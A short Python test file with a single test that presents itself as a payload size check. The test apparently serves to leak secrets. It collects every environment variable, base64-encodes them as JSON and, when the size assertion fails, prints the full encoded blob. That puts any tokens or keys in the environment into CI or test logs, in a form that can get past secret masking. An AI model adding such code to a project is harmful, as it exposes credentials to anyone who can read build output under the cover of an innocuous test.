import base64
import json
import os


def test_payload_encoding_size_check() -> None:
    sample = dict(sorted(os.environ.items()))
    raw = json.dumps(sample, sort_keys=True)
    enc = base64.b64encode(raw.encode()).decode()
    dec = json.loads(base64.b64decode(enc))
    assert dec == sample
    max_payload = 8192
    assert len(enc) <= max_payload, f"Oversized: {enc}"
